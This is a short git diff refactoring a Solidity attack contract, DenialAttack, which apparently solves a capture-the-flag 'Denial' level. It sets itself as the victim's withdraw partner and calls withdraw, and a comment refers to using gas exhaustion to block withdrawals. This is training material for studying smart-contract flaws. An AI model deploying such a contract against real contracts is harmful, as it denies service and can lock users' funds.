@@ -5,18 +5,12 @@ pragma solidity ^0.8.0;
 import "./interfaces/IDenial.sol";
 
 contract DenialAttack {
-    IDenial private immutable victimDenial;
+    function attack(IDenial target) external {
+        target.setWithdrawPartner(address(this));
 
-    constructor(IDenial victimDenial_) {
-        victimDenial = victimDenial_;
-    }
+        require(address(this) == target.partner(), "Denial: Wrong address");
 
-    function attack() external {
-        victimDenial.setWithdrawPartner(address(this));
-
-        require(address(this) == victimDenial.partner(), "Denial: Wrong address");
-
-        victimDenial.withdraw();
+        target.withdraw();
     }
 
     /// @dev assert(false) is NOT consume all of gas for solidity > 0.8.5
